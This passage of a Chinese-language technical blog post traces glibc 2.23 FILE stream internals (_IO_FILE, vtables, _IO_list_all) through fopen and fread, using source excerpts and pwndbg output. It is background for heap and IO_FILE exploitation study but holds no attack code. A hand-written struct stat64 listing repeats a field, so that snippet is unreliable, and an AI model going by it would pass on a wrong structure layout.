        <content type="html"><![CDATA[<h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO FILE"></a>IO FILE</h2><p><code>IO_FILE</code>结构体：通过<code>chain</code>域连接<code>stderr</code>、<code>stdout</code>、<code>stdin</code>的链表，链表的表头是<code>__IO_list_all</code>，<code>stderr</code>、<code>stdout</code>、<code>stdin</code>是程序启动时打开的文件流,<code>_IO_FILE</code>结构体定义在<code>libio.h</code>头文件中，<code>gdb</code>查看结构体可以使用命令：<code>p *_IO_list_all</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct _IO_FILE &#123;  int _flags;&#x2F;* High-order word is _IO_MAGIC; rest is flags. *&#x2F;#define _IO_file_flags _flags  char* _IO_read_ptr;&#x2F;* Current read pointer *&#x2F;  char* _IO_read_end;&#x2F;* End of get area. *&#x2F;  char* _IO_read_base;&#x2F;* Start of putback+get area. *&#x2F;  char* _IO_write_base;&#x2F;* Start of put area. *&#x2F;  char* _IO_write_ptr;&#x2F;* Current put pointer. *&#x2F;  char* _IO_write_end;&#x2F;* End of put area. *&#x2F;  char* _IO_buf_base;&#x2F;* Start of reserve area. *&#x2F;  char* _IO_buf_end;&#x2F;* End of reserve area. *&#x2F;  &#x2F;* The following fields are used to support backing up and undo. *&#x2F;  char *_IO_save_base; &#x2F;* Pointer to start of non-current get area. *&#x2F;  char *_IO_backup_base;  &#x2F;* Pointer to first valid character of backup area *&#x2F;  char *_IO_save_end; &#x2F;* Pointer to end of non-current get area. *&#x2F;  struct _IO_marker *_markers;  struct _IO_FILE *_chain;  int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; &#x2F;* This used to be _offset but it&#39;s too small.  *&#x2F;#define __HAVE_COLUMN &#x2F;* temporary *&#x2F;  &#x2F;* 1+column number of pbase(); 0 is unknown. *&#x2F;  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  &#x2F;*  char* _save_gptr;  char* _save_egptr; *&#x2F;  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">        stderr     stdout      stdinIO_list_all  ––⇨     flag   ¦ ⇨   flag   ¦ ⇨   flag                     chain   ––      chain    ––      chain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>_IO_FILE_plus</code>结构体：定义在<code>libioP.h</code>中，包含<code>vtable</code>虚函数表</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct _IO_FILE_plus&#123;  _IO_FILE file;  const struct _IO_jump_t *vtable;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>vtable</code>：是一个函数指针数组，存储了一个类的虚函数的地址，<code>_IO_jump_t</code>是一个结构体，它定义了一组函数指针，用于实现<code>_IO_FILE_plus</code>结构体中的虚函数表。这些函数指针对应了<code>_IO_FILE_plus</code>结构体中的各种操作，通过虚函数表，可以实现对<code>_IO_FILE_plus</code>结构体中的函数进行动态绑定，使得在运行时可以根据具体对象的类型来调用相应的函数。<code>gdb</code>查看结构体内容时可以使用命令:<code>p *_IO_list_all-&gt;vtable</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct _IO_jump_t&#123;    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow);    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    &#x2F;* showmany *&#x2F;    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);#if 0    get_column;    set_column;#endif&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>_IO_wide_data</code>结构体：结构体中实现了虚表</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct _IO_wide_data&#123;  wchar_t *_IO_read_ptr;&#x2F;* Current read pointer *&#x2F;  wchar_t *_IO_read_end;&#x2F;* End of get area. *&#x2F;  wchar_t *_IO_read_base;&#x2F;* Start of putback+get area. *&#x2F;  wchar_t *_IO_write_base;&#x2F;* Start of put area. *&#x2F;  wchar_t *_IO_write_ptr;&#x2F;* Current put pointer. *&#x2F;  wchar_t *_IO_write_end;&#x2F;* End of put area. *&#x2F;  wchar_t *_IO_buf_base;&#x2F;* Start of reserve area. *&#x2F;  wchar_t *_IO_buf_end;&#x2F;* End of reserve area. *&#x2F;  &#x2F;* The following fields are used to support backing up and undo. *&#x2F;  wchar_t *_IO_save_base;&#x2F;* Pointer to start of non-current get area. *&#x2F;  wchar_t *_IO_backup_base;&#x2F;* Pointer to first valid character of   backup area *&#x2F;  wchar_t *_IO_save_end;&#x2F;* Pointer to end of non-current get area. *&#x2F;  __mbstate_t _IO_state;  __mbstate_t _IO_last_state;  struct _IO_codecvt _codecvt;  wchar_t _shortbuf[1];  const struct _IO_jump_t *_wide_vtable;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>st</code>结构体：<code>struct stat64</code>是一个结构体，用于存储文件的状态信息。在<code>_IO_file_doallocate</code>函数中，通过调用<code>_IO_SYSSTAT</code>宏来获取文件的状态信息，并将其存储在<code>st</code>结构体中。然后根据文件的类型和块大小来确定缓冲区的大小，并使用<code>malloc</code>函数分配相应大小的内存。最后，使用<code>_IO_setb</code>函数将分配的内存设置为文件的缓冲区</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct stat64 &#123;    __dev_t         st_dev;         &#x2F;* 文件所在的设备的ID *&#x2F;    __ino64_t       st_ino;         &#x2F;* 文件的inode号 *&#x2F;    __mode_t        st_mode;        &#x2F;* 文件的类型和访问权限 *&#x2F;    __nlink_t       st_nlink;       &#x2F;* 文件的硬链接数 *&#x2F;    __uid_t         st_uid;         &#x2F;* 文件的所有者的用户ID *&#x2F;    __gid_t         st_gid;         &#x2F;* 文件的所有者的组ID *&#x2F;    __dev_t         st_rdev;        &#x2F;* 如果文件是特殊文件（如设备文件），则为其设备号 *&#x2F;    __off64_t       st_size;        &#x2F;* 文件的大小（以字节为单位） *&#x2F;    __blksize_t     st_blksize;     &#x2F;* 文件系统的块大小 *&#x2F;    __blkcnt64_t    st_blocks;      &#x2F;* 文件所占用的块数 *&#x2F;    struct timespec st_atim;        &#x2F;* 文件的最后访问时间 *&#x2F;    struct timespec st_mtim;        &#x2F;* 文件的最后修改时间 *&#x2F;    struct timespec st_ctim;        &#x2F;* 文件的最后状态更改时间 *&#x2F;    __ino64_t       st_ino;         &#x2F;* 文件的inode号（备用） *&#x2F;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    FILE*fp &#x3D; fopen(&quot;test&quot;,&quot;wb&quot;);    char *ptr &#x3D; malloc(0x20);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进<code>fopen</code>函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">► 0x555555555183 &lt;main+26&gt;    call   fopen@plt                &lt;fopen@plt&gt;        filename: 0x555555556007 ◂— 0x31b010074736574 &#x2F;* &#39;test&#39; *&#x2F;        modes: 0x555555556004 ◂— 0x74736574006277 &#x2F;* &#39;wb&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到真正调用的是<code>_IO_new_fopen</code>函数，接下来调用<code>__fopen_internal</code>函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;iofopen.c    92 &#125;    93     94 _IO_FILE *    95 _IO_new_fopen (const char *filename, const char *mode)    96 &#123; ►  97   return __fopen_internal (filename, mode, 1);    98 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为<code>locked_FILE</code>结构体变量<code>new_f</code>分配<code>0x230</code>的空间，结构体如下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C"> struct locked_FILE  &#123;    struct _IO_FILE_plus fp;#ifdef _IO_MTSAFE_IO    _IO_lock_t lock;#endif    struct _IO_wide_data wd;  &#125; *new_f &#x3D; (struct locked_FILE *) malloc (sizeof (struct locked_FILE));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x231Top chunk | PREV_INUSEAddr: 0x55555555b230Size: 0x20dd1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来调用<code>_IO_no_init</code>对结构体中的成员进行<code>null</code>初始化</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;iofopen.c   72     return NULL;   73 #ifdef _IO_MTSAFE_IO   74   new_f-&gt;fp.file._lock &#x3D; &amp;new_f-&gt;lock;   75 #endif   76 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T ► 77   _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);   78 #else<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">void_IO_no_init (_IO_FILE *fp, int flags, int orientation,     struct _IO_wide_data *wd, const struct _IO_jump_t *jmp)&#123;  _IO_old_init (fp, flags);  fp-&gt;_mode &#x3D; orientation;#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T  if (orientation &gt;&#x3D; 0)    &#123;      fp-&gt;_wide_data &#x3D; wd;      fp-&gt;_wide_data-&gt;_IO_buf_base &#x3D; NULL;      fp-&gt;_wide_data-&gt;_IO_buf_end &#x3D; NULL;      fp-&gt;_wide_data-&gt;_IO_read_base &#x3D; NULL;      fp-&gt;_wide_data-&gt;_IO_read_ptr &#x3D; NULL;      fp-&gt;_wide_data-&gt;_IO_read_end &#x3D; NULL;      fp-&gt;_wide_data-&gt;_IO_write_base &#x3D; NULL;      fp-&gt;_wide_data-&gt;_IO_write_ptr &#x3D; NULL;      fp-&gt;_wide_data-&gt;_IO_write_end &#x3D; NULL;      fp-&gt;_wide_data-&gt;_IO_save_base &#x3D; NULL;      fp-&gt;_wide_data-&gt;_IO_backup_base &#x3D; NULL;      fp-&gt;_wide_data-&gt;_IO_save_end &#x3D; NULL;      fp-&gt;_wide_data-&gt;_wide_vtable &#x3D; jmp;    &#125;  else    &#x2F;* Cause predictable crash when a wide function is called on a byte       stream.  *&#x2F;    fp-&gt;_wide_data &#x3D; (struct _IO_wide_data *) -1L;#endif  fp-&gt;_freeres_list &#x3D; NULL;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初始化完成之后结构体中的内容如下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p new_f-&gt;fp$1 &#x3D; &#123;  file &#x3D; &#123;    _flags &#x3D; -72548352,    _IO_read_ptr &#x3D; 0x0,    _IO_read_end &#x3D; 0x0,    _IO_read_base &#x3D; 0x0,    _IO_write_base &#x3D; 0x0,    _IO_write_ptr &#x3D; 0x0,    _IO_write_end &#x3D; 0x0,    _IO_buf_base &#x3D; 0x0,    _IO_buf_end &#x3D; 0x0,    _IO_save_base &#x3D; 0x0,    _IO_backup_base &#x3D; 0x0,    _IO_save_end &#x3D; 0x0,    _markers &#x3D; 0x0,    _chain &#x3D; 0x0,    _fileno &#x3D; 0,    _flags2 &#x3D; 0,    _old_offset &#x3D; 0,    _cur_column &#x3D; 0,    _vtable_offset &#x3D; 0 &#39;\000&#39;,    _shortbuf &#x3D; &quot;&quot;,    _lock &#x3D; 0x55555555b0f0,    _offset &#x3D; 0,    _codecvt &#x3D; 0x0,    _wide_data &#x3D; 0x55555555b100,    _freeres_list &#x3D; 0x0,    _freeres_buf &#x3D; 0x0,    __pad5 &#x3D; 0,    _mode &#x3D; 0,    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;  &#125;,  vtable &#x3D; 0x0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来调用<code>_IO_file_init</code>将该结构体连接到<code>_IO_list_all</code>中，实际调用的是<code>_IO_new_file_init</code>函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;iofopen.c   77   _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);   78 #else   79   _IO_no_init (&amp;new_f-&gt;fp.file, 1, 0, NULL, NULL);   80 #endif   81   _IO_JUMPS (&amp;new_f-&gt;fp) &#x3D; &amp;_IO_file_jumps; ► 82   _IO_file_init (&amp;new_f-&gt;fp);   83 #if  !_IO_UNIFIED_JUMPTABLES   84   new_f-&gt;fp.vtable &#x3D; NULL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">void_IO_new_file_init (struct _IO_FILE_plus *fp)&#123;  &#x2F;* POSIX.1 allows another file handle to be used to change the position     of our file descriptor.  Hence we actually don&#39;t know the actual     position before we do the first fseek (and until a following fflush). *&#x2F;  fp-&gt;file._offset &#x3D; _IO_pos_BAD;  fp-&gt;file._IO_file_flags |&#x3D; CLOSED_FILEBUF_FLAGS;  _IO_link_in (fp);  fp-&gt;file._fileno &#x3D; -1;&#125;libc_hidden_ver (_IO_new_file_init, _IO_file_init)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>_IO_new_file_init</code>函数中调用了<code>_IO_link_in</code>函数用于将文件指针链接到全局文件链表中</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void_IO_link_in (struct _IO_FILE_plus *fp)&#123;  if ((fp-&gt;file._flags &amp; _IO_LINKED) &#x3D;&#x3D; 0)    &#123;      fp-&gt;file._flags |&#x3D; _IO_LINKED;#ifdef _IO_MTSAFE_IO      _IO_cleanup_region_start_noarg (flush_cleanup);      _IO_lock_lock (list_all_lock);      run_fp &#x3D; (_IO_FILE *) fp;      _IO_flockfile ((_IO_FILE *) fp);#endif      fp-&gt;file._chain &#x3D; (_IO_FILE *) _IO_list_all;      _IO_list_all &#x3D; fp;      ++_IO_list_all_stamp;#ifdef _IO_MTSAFE_IO      _IO_funlockfile ((_IO_FILE *) fp);      run_fp &#x3D; NULL;      _IO_lock_unlock (list_all_lock);      _IO_cleanup_region_end (0);#endif    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数首先检查文件指针的<code>_flags</code>属性是否包含 <code>_IO_LINKED</code> 标志位，如果不包含，则说明还没有链接到链表中，接下来，将结构体的 <code>_chain</code> 属性设置为之前的链表的值并设置<code>_IO_LINKED</code>标志位，查看链表中的内容，将会指向新加入的结构体</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p _IO_list_all$3 &#x3D; (struct _IO_FILE_plus *) 0x55555555b010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>调用<code>_IO_file_fopen</code>打开文件</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;iofopen.c   81   _IO_JUMPS (&amp;new_f-&gt;fp) &#x3D; &amp;_IO_file_jumps;   82   _IO_file_init (&amp;new_f-&gt;fp);   83 #if  !_IO_UNIFIED_JUMPTABLES   84   new_f-&gt;fp.vtable &#x3D; NULL;   85 #endif ► 86   if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) !&#x3D; NULL)   87     return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);   88    89   _IO_un_link (&amp;new_f-&gt;fp);   90   free (new_f);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实际调用的是<code>_IO_new_file_fopen</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">_IO_new_file_fopen (_IO_FILE *fp, const char *filename, const char *mode,    int is32not64)&#123;  ...  if (_IO_file_is_open (fp))    return 0;  switch (*mode)    &#123;    case &#39;r&#39;:      omode &#x3D; O_RDONLY;      read_write &#x3D; _IO_NO_WRITES;      break;    ...    &#125;#ifdef _LIBC  last_recognized &#x3D; mode;#endif  for (i &#x3D; 1; i &lt; 7; ++i)    &#123;      switch (*++mode)&#123;case &#39;\0&#39;:  break;case &#39;+&#39;:  omode &#x3D; O_RDWR;  read_write &amp;&#x3D; _IO_IS_APPENDING;#ifdef _LIBC  last_recognized &#x3D; mode;#endif  continue;...    &#125;  result &#x3D; _IO_file_open (fp, filename, omode|oflags, oprot, read_write,  is32not64);    ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会先判断文件是否已被打开，如果已经打开则返回，接下来设置打开模式和一些标志位，最后调用<code>_IO_file_open</code>真正打开文件</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">_IO_file_open (_IO_FILE *fp, const char *filename, int posix_mode, int prot,       int read_write, int is32not64)&#123;  int fdesc;#ifdef _LIBC  if (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))    fdesc &#x3D; open_not_cancel (filename,     posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);  else    fdesc &#x3D; open (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);#else  fdesc &#x3D; open (filename, posix_mode, prot);#endif  if (fdesc &lt; 0)    return NULL;  fp-&gt;_fileno &#x3D; fdesc;  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);  &#x2F;* For append mode, send the file offset to the end of the file.  Don&#39;t     update the offset cache though, since the file handle is not active.  *&#x2F;  if ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))      &#x3D;&#x3D; (_IO_IS_APPENDING | _IO_NO_READS))    &#123;      _IO_off64_t new_pos &#x3D; _IO_SYSSEEK (fp, 0, _IO_seek_end);      if (new_pos &#x3D;&#x3D; _IO_pos_BAD &amp;&amp; errno !&#x3D; ESPIPE)&#123;  close_not_cancel (fdesc);  return NULL;&#125;    &#125;  _IO_link_in ((struct _IO_FILE_plus *) fp);  return fp;&#125;libc_hidden_def (_IO_file_open)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用<code>open</code>系统调用函数打开文件之后设置<code>fileno</code>标志位，再调用<code>_IO_link_in</code>使结构体进入<code>_IO_list_all</code>，至此<code>fopen</code>函数调试结束</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p new_f-&gt;fp$6 &#x3D; &#123;  file &#x3D; &#123;    _flags &#x3D; -72539004,    _IO_read_ptr &#x3D; 0x0,    _IO_read_end &#x3D; 0x0,    _IO_read_base &#x3D; 0x0,    _IO_write_base &#x3D; 0x0,    _IO_write_ptr &#x3D; 0x0,    _IO_write_end &#x3D; 0x0,    _IO_buf_base &#x3D; 0x0,    _IO_buf_end &#x3D; 0x0,    _IO_save_base &#x3D; 0x0,    _IO_backup_base &#x3D; 0x0,    _IO_save_end &#x3D; 0x0,    _markers &#x3D; 0x0,    _chain &#x3D; 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,    _fileno &#x3D; 3,    _flags2 &#x3D; 0,    _old_offset &#x3D; 0,    _cur_column &#x3D; 0,    _vtable_offset &#x3D; 0 &#39;\000&#39;,    _shortbuf &#x3D; &quot;&quot;,    _lock &#x3D; 0x55555555b0f0,    _offset &#x3D; -1,    _codecvt &#x3D; 0x0,    _wide_data &#x3D; 0x55555555b100,    _freeres_list &#x3D; 0x0,    _freeres_buf &#x3D; 0x0,    __pad5 &#x3D; 0,    _mode &#x3D; 0,    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;  &#125;,  vtable &#x3D; 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;&#125;pwndbg&gt; p _IO_list_all$7 &#x3D; (struct _IO_FILE_plus *) 0x55555555b010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;int main()&#123;    char data[20];    FILE *fp &#x3D; fopen(&quot;test&quot;, &quot;rb&quot;);    fread(data, 1, 20, fp);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入<code>read</code>函数之后实际调用的是<code>_IO_fread</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;iofread.c   26    27 #include &quot;libioP.h&quot;   28    29 _IO_size_t   30 _IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp) ► 31 &#123;   32   _IO_size_t bytes_requested &#x3D; size * count;   33   _IO_size_t bytes_read;   34   CHECK_FILE (fp, 0);   35   if (bytes_requested &#x3D;&#x3D; 0)   36     return 0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源码如下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">_IO_size_t_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)&#123;  ...  bytes_read &#x3D; _IO_sgetn (fp, (char *) buf, bytes_requested);  _IO_release_lock (fp);  return bytes_requested &#x3D;&#x3D; bytes_read ? count : bytes_read &#x2F; size;&#125;libc_hidden_def (_IO_fread)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用了<code>_IO_sgetn</code>函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">► 0x7ffff7a7c171 &lt;fread+145&gt;    call   _IO_sgetn                &lt;_IO_sgetn&gt;        arg0: 0x405010 ◂— 0xfbad2488        arg1: 0x7fffffffde40 —▸ 0x4011a0 (__libc_csu_init) ◂— endbr64         arg2: 0x14<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">  464 _IO_sgetn (_IO_FILE *fp, void *data, _IO_size_t n)  465 &#123;  466   &#x2F;* FIXME handle putback buffer here! *&#x2F;► 467   return _IO_XSGETN (fp, data, n);  468 &#125;  469 libc_hidden_def (_IO_sgetn)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数调用了<code>_IO_XSGETN</code>函数，实际调用的是<code>_IO_file_xsgetn</code>函数，即<code>vtable</code>的<code>__xsgetn</code>函数，作用是从文件流中读取指定数量的字节，并将其存储到指定的缓冲区中</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;fileops.c   1355 &#125;   1356 libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)   1357    1358 _IO_size_t   1359 _IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n) ► 1360 &#123;   1361   _IO_size_t want, have;   1362   _IO_ssize_t count;   1363   char *s &#x3D; data;   1364    1365   want &#x3D; n;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *_IO_list_all-&gt;vtable$1 &#x3D; &#123;  __dummy &#x3D; 0,  __dummy2 &#x3D; 0,  __finish &#x3D; 0x7ffff7a878f0 &lt;_IO_new_file_finish&gt;,  __overflow &#x3D; 0x7ffff7a88660 &lt;_IO_new_file_overflow&gt;,  __underflow &#x3D; 0x7ffff7a883d0 &lt;_IO_new_file_underflow&gt;,  __uflow &#x3D; 0x7ffff7a89530 &lt;__GI__IO_default_uflow&gt;,  __pbackfail &#x3D; 0x7ffff7a8a8b0 &lt;__GI__IO_default_pbackfail&gt;,  __xsputn &#x3D; 0x7ffff7a87110 &lt;_IO_new_file_xsputn&gt;,  __xsgetn &#x3D; 0x7ffff7a86df0 &lt;__GI__IO_file_xsgetn&gt;,  __seekoff &#x3D; 0x7ffff7a863f0 &lt;_IO_new_file_seekoff&gt;,  __seekpos &#x3D; 0x7ffff7a89930 &lt;_IO_default_seekpos&gt;,  __setbuf &#x3D; 0x7ffff7a86360 &lt;_IO_new_file_setbuf&gt;,  __sync &#x3D; 0x7ffff7a862a0 &lt;_IO_new_file_sync&gt;,  __doallocate &#x3D; 0x7ffff7a7b130 &lt;__GI__IO_file_doallocate&gt;,  __read &#x3D; 0x7ffff7a870d0 &lt;__GI__IO_file_read&gt;,  __write &#x3D; 0x7ffff7a86aa0 &lt;_IO_new_file_write&gt;,  __seek &#x3D; 0x7ffff7a868a0 &lt;__GI__IO_file_seek&gt;,  __close &#x3D; 0x7ffff7a86270 &lt;__GI__IO_file_close&gt;,  __stat &#x3D; 0x7ffff7a86a90 &lt;__GI__IO_file_stat&gt;,  __showmanyc &#x3D; 0x7ffff7a8aa20 &lt;_IO_default_showmanyc&gt;,  __imbue &#x3D; 0x7ffff7a8aa30 &lt;_IO_default_imbue&gt;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进该函数， 